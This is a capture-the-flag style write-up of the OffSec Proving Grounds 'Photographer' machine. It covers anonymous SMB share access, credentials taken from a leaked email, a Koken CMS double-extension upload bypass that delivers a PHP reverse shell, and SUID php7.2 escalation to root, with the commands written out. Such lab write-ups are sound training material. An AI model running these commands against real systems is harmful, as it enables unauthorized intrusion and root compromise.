# Photographer

| Field | Details |
|-------|---------|
| **Platform** | OffSec Proving Grounds Play |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy (Community rates it Intermediate) |
| **Date** | 2026-04-07 |
| **Status** | Completed |

---

## Overview

This machine taught me that SMB is never just background noise. An open share with no password had an email sitting in it — and that email had the credentials I needed for the whole machine. After that it was a file upload bypass on Koken CMS and a SUID binary to get root. Clean chain once you see it.

---

## Attack Path Summary

```
SMB null session → mailsent.txt → credentials → Koken CMS login → file upload bypass → www-data shell → SUID php7.2 → root
```

---

## Enumeration

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 — static site, nothing useful |
| 139/445 | SMB | Samba 4.3.11 |
| 8000 | HTTP | Koken CMS 0.22.24 |

### What stood out

- SMB was open with null session — no password needed to list shares
- Port 8000 footer showed Koken version — that version number matters
- Port 80 was a dead end, just a photographer portfolio site

---

## Foothold

### SMB — where it actually started

First thing I did was check SMB for anonymous access:

```bash
smbclient -L //192.168.112.76 -N
```

Found a share called `sambashare`. Connected and grabbed everything inside:

```bash
smbclient //192.168.112.76/sambashare -N
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

`mailsent.txt` was an old email between two users. The important part:

> *"Don't forget your secret, my babygirl"*

Two email addresses in the headers: `agi@photographer.com` and `daisa@photographer.com`. Combined with "babygirl" — tried `daisa@photographer.com:babygirl` on Koken admin at port 8000 and it worked first try.

### Koken CMS — file upload bypass

Koken 0.22.24 has a known authenticated file upload vulnerability. The filter checks file extensions but only the last one — so `shell.php.jpg` gets accepted as an image.

Set up the reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# edited $ip and $port inside the file
mv shell.php shell.php.jpg
```

Started listener:

```bash
nc -lvnp 4444
```

With Burp intercept ON, uploaded the file through Koken Library. The POST request had two places with the filename — changed both from `shell.php.jpg` to `shell.php` then forwarded.

The key line to change in Burp:
```
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
                                                        ↑ remove .jpg here
```

After upload, clicked **Download File** on the file in the library. Shell came back immediately.

Stabilized:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### SUID php7.2

Ran the standard SUID search:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/php7.2` showed up with SUID set. Checked GTFOBins for PHP SUID — one command to root:

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Root shell. Done.

---

## Flags

- `local.txt` — `/home/daisa/local.txt`
- `proof.txt` — `/root/proof.txt`

---

## What I learned

- SMB null sessions are always worth checking — this whole machine hinged on one file in a share
- File upload filters that only check the last extension are bypassable with double extensions like `.php.jpg`
- Burp intercept is the tool for this — find the `filename=` parameter, change the extension, forward
- SUID binaries + GTFOBins = fast privesc when you find the right binary
- Always stabilize the shell before doing anything else

---

## References

- [GTFOBins - PHP SUID](https://gtfobins.github.io/gtfobins/php/#suid)
- [Exploit-DB 48706 - Koken CMS File Upload](https://www.exploit-db.com/exploits/48706)
